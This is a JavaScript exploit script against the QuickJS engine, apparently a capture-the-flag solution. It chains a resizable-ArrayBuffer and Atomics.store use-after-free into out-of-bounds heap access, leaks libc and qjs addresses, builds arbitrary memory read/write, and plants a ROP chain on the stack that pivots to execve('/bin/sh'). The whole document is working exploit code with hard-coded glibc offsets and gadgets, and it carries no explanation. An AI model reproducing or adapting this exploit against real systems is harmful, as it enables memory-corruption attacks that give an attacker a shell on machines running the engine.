// exec-shell-cfi exploit: Atomics+RAB UAF -> heap OOB -> stack pivot -> execve("/bin/sh")

const conv_ab = new ArrayBuffer(8);
const conv_f64 = new Float64Array(conv_ab);
const conv_u32 = new Uint32Array(conv_ab);
function f2u64(f){ conv_f64[0]=f; return BigInt(conv_u32[0]) | (BigInt(conv_u32[1])<<32n); }
function u64_to_f64(x){ conv_u32[0]=Number(x&0xffffffffn); conv_u32[1]=Number((x>>32n)&0xffffffffn); return conv_f64[0]; }
function isLikelyLibcPtr(x){ return (x>>40n)===0x7fn; }
function isLikelyHeapPtr(x){ const t=x>>40n; return t===0x55n||t===0x56n||t===0x57n; }

const BACKING_LEN = 0x13370;

// glibc offsets
const OFF_UNSORTED_FD = 0x1e7b20n;
const OFF_ENVIRON = 0x1eee28n;
const OFF_EXECVE = 0xdddd0n;

// libc gadgets
const OFF_POP_RDI_RET = 0x2a145n;
const OFF_POP_RSI_RET = 0x2baa9n;
const OFF_POP_RDX_POP_RBX_RET = 0x8f0c5n;
const OFF_RET = 0x2846bn;
const OFF_POP_RSP_RET = 0x285d8n;

// qjs symbol offset
const OFF_JS_ARRAY_BUFFER_FREE = 0x107df0n;

// backing
let backing = new ArrayBuffer(BACKING_LEN);
let dv_backing = new DataView(backing);
let u8 = new Uint8Array(backing);
u8[0]=0x2f;u8[1]=0x62;u8[2]=0x69;u8[3]=0x6e;u8[4]=0x2f;u8[5]=0x73;u8[6]=0x68;u8[7]=0;

// OOB via Atomics.store
let rab = new ArrayBuffer(72,{maxByteLength:0x4000});
let atomic_view = new BigUint64Array(rab);
let barrier0 = new ArrayBuffer(0x1000);
let oob;
let mal = { valueOf(){ rab.resize(0x2000); oob = new Float64Array(backing); return 0x400000n; } };
Atomics.store(atomic_view, 8, mal);

// libc leak
let fillers=[];
const N=14;
for(let i=0;i<N;i++) fillers.push(new ArrayBuffer(0x10000));
let uns = new ArrayBuffer(0x3000);
let dv_uns = new DataView(uns);
const m0=0xdeadbeef,m1=0xcafebabe,m2=0xabad1dea,m3=0x13371337;
dv_uns.setUint32(0x20,m0,true);dv_uns.setUint32(0x24,m1,true);dv_uns.setUint32(0x28,m2,true);dv_uns.setUint32(0x2c,m3,true);
let barrier1 = new ArrayBuffer(0x8000);
uns=null;dv_uns=null;
const scan_max = (((N+1)*0x10000)+0x8000)/8;
let fd=0n;
for(let i=0;i<scan_max;i++){
  conv_f64[0]=oob[i]; if(conv_u32[0]!==m0||conv_u32[1]!==m1) continue;
  conv_f64[0]=oob[i+1]; if(conv_u32[0]!==m2||conv_u32[1]!==m3) continue;
  let cand=f2u64(oob[i-4]); if(!isLikelyLibcPtr(cand)) continue;
  fd=cand; break;
}
if(fd===0n) throw new Error('libc leak failed');
const libc_base = fd - OFF_UNSORTED_FD;

// qjs base
const RW_AB_LEN=0x1337;
let rw_ab=new ArrayBuffer(RW_AB_LEN);
let rw_abuf_idx=-1;
for(let i=0;i<scan_max;i++){
  conv_f64[0]=oob[i];
  if(conv_u32[0]!==RW_AB_LEN||conv_u32[1]!==0xffffffff) continue;
  if(f2u64(oob[i+3])!==f2u64(oob[i+4])) continue;
  rw_abuf_idx=i; break;
}
if(rw_abuf_idx<0) throw new Error('no rw_ab abuf');
const qjs_base = f2u64(oob[rw_abuf_idx+6]) - OFF_JS_ARRAY_BUFFER_FREE;

// choose a reachable Uint32Array(backing)
const mem32_count = BACKING_LEN/4;
let views=[];
for(let i=0;i<0x120;i++) views.push(new Uint32Array(backing));
let arb_obj_idx=-1;
const MAGIC_LEN=0x414141;
for(let i=2;i<scan_max;i++){
  conv_f64[0]=oob[i];
  if(conv_u32[0]!==mem32_count) continue;
  const ta=f2u64(oob[i-2]);
  const dp=f2u64(oob[i-1]);
  if(!isLikelyHeapPtr(ta) || !isLikelyHeapPtr(dp)) continue;
  const base=i-8;
  oob[base+8] = u64_to_f64(BigInt(MAGIC_LEN));
  let which=-1;
  for(let j=0;j<views.length;j++) if(views[j].length===MAGIC_LEN){ which=j; break; }
  if(which>=0){ arb_obj_idx=base; views=[views[which]]; break; }
  oob[base+8] = u64_to_f64(BigInt(mem32_count));
}
if(arb_obj_idx<0) throw new Error('no reachable Uint32Array');
let arb_u32 = views[0];

const backing_data = f2u64(oob[arb_obj_idx+7]);
const binsh = backing_data;
const argv = backing_data + 0x100n;
dv_backing.setBigUint64(0x100, binsh, true);
dv_backing.setBigUint64(0x108, 0n, true);

// enlarge length
oob[arb_obj_idx+8] = u64_to_f64(0x40000000n);

function set_base(addr){ oob[arb_obj_idx+7] = u64_to_f64(addr); }
function r32(off){ return arb_u32[off>>>2]; }
function r64(off){ const lo=BigInt(arb_u32[off>>>2]); const hi=BigInt(arb_u32[(off>>>2)+1]); return lo|(hi<<32n); }
function w64(off,val){ arb_u32[off>>>2]=Number(val&0xffffffffn); arb_u32[(off>>>2)+1]=Number((val>>32n)&0xffffffffn); }

// parse qjs exec segment
set_base(qjs_base);
if(r32(0)!==0x464c457f) throw new Error('qjs magic fail');
const e_phoff = r64(0x20);
const e_phentsize = (r32(0x34)>>>16)&0xffff;
const e_phnum = r32(0x38)&0xffff;
let text_lo=0n,text_hi=0n;
for(let i=0;i<e_phnum;i++){
  const ph_off = Number(e_phoff) + i*e_phentsize;
  const p_type = r32(ph_off);
  const p_flags = r32(ph_off+4);
  if(p_type!==1 || (p_flags&1)===0) continue;
  const p_vaddr = r64(ph_off+0x10);
  const p_memsz = r64(ph_off+0x28);
  text_lo = qjs_base + p_vaddr;
  text_hi = text_lo + p_memsz;
  break;
}
if(text_lo===0n) throw new Error('no exec seg');

// build chain
const g_ret = libc_base + OFF_RET;
const g_pop_rdi = libc_base + OFF_POP_RDI_RET;
const g_pop_rsi = libc_base + OFF_POP_RSI_RET;
const g_pop_rdx_rbx = libc_base + OFF_POP_RDX_POP_RBX_RET;
const g_pop_rsp = libc_base + OFF_POP_RSP_RET;
const a_execve = libc_base + OFF_EXECVE;

const chain_off = 0x200;
const chain_addr = backing_data + BigInt(chain_off);
let chain = [g_ret, g_pop_rdi, binsh, g_pop_rsi, argv, g_pop_rdx_rbx, 0n, 0n, a_execve];
for(let i=0;i<chain.length;i++) dv_backing.setBigUint64(chain_off + i*8, chain[i], true);

// get envp
set_base(libc_base + OFF_ENVIRON);
const envp = r64(0);

// patch a small window close to envp to reduce false positives
const SCAN = 0x80000; // 512KB
const stack_start = envp - BigInt(SCAN);
set_base(stack_start);
const text_hi32 = Number((text_lo>>32n)&0xffffffffn);

let patched=0;
for(let off=SCAN-16; off>=0 && patched<8; off-=8){
  const hi = arb_u32[(off>>>2)+1];
  if(hi !== text_hi32) continue;
  const v = r64(off);
  if(v < text_lo || v >= text_hi) continue;
  w64(off, g_pop_rsp);
  w64(off+8, chain_addr);
  patched++;
}
if(patched===0) throw new Error('no candidates');

// on return -> pivot -> execve
